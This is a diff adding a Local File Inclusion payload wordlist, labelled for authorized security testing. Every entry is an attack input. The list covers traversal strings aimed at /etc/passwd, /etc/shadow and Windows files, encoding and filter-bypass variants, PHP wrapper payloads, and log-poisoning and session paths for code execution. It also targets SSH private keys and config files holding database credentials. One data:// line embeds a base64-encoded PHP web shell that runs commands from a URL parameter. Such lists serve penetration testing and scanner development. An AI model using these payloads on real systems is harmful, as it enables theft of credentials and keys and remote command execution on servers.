@@ -1,0 +1,163 @@
+# LFI Payload Wordlist for Academic Security Testing
+# This wordlist contains common Local File Inclusion payloads
+# For authorized security testing only
+
+# Basic Linux LFI
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# Linux system files
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/group
+/etc/issue
+/etc/motd
+/proc/self/environ
+/proc/version
+/proc/cmdline
+
+# URL encoded traversal
+..%2Fetc%2Fpasswd
+..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+# Double URL encoding
+..%252Fetc%252Fpasswd
+..%252F..%252Fetc%252Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+
+# Windows LFI
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+
+# Windows system files
+c:\windows\win.ini
+c:\windows\system32\drivers\etc\hosts
+c:\boot.ini
+c:\windows\system.ini
+c:\windows\php.ini
+
+# Mixed encoding
+..%5Cetc%5Cpasswd
+..%5C..%5Cetc%5Cpasswd
+..%255Cetc%255Cpasswd
+
+# Null byte injection (legacy PHP < 5.3)
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.txt
+../../../etc/passwd%00.php
+
+# PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+# Log file poisoning paths
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+../../var/log/apache2/access.log
+../../../var/log/apache2/access.log
+../../../../var/log/apache2/access.log
+
+# Common web paths
+/var/www/html/index.php
+../index.php
+../../index.php
+../../../index.php
+./index.php
+index.php
+
+# Config files
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/mysql/my.cnf
+/etc/php.ini
+/usr/local/etc/php.ini
+../../../config.php
+../../../../config.php
+../config/database.yml
+../../application/config/database.php
+
+# Proc filesystem
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/environ
+/proc/version
+/proc/cpuinfo
+/proc/meminfo
+
+# Filter bypass techniques
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+..;/etc/passwd
+/etc/passwd/././././.
+..\..//..\..//..\..//etc//passwd
+
+# Absolute paths
+file:///etc/passwd
+file://c:/windows/win.ini
+/etc/passwd
+C:/windows/win.ini
+
+# ZIP wrapper
+zip://archive.zip#file.txt
+zip://archive.zip%23file.txt
+
+# PHAR wrapper
+phar://archive.phar/file.txt
+
+# glob:// wrapper
+glob://some/path/*
+
+# expect:// wrapper (if expect extension loaded)
+expect://whoami
+
+# LFI to RCE via session
+/var/lib/php/sessions/sess_SESSIONID
+/var/lib/php5/sess_SESSIONID
+/tmp/sess_SESSIONID
+
+# SSH paths
+~/.ssh/authorized_keys
+~/.ssh/id_rsa
+~/.ssh/id_dsa
+~/.ssh/known_hosts
+
+# Application specific
+../app/config/database.yml
+../../wp-config.php
+../../../wp-config.php
+../../../../wp-config.php
+../config/config.php
+../../configuration.php
+../../../settings.php
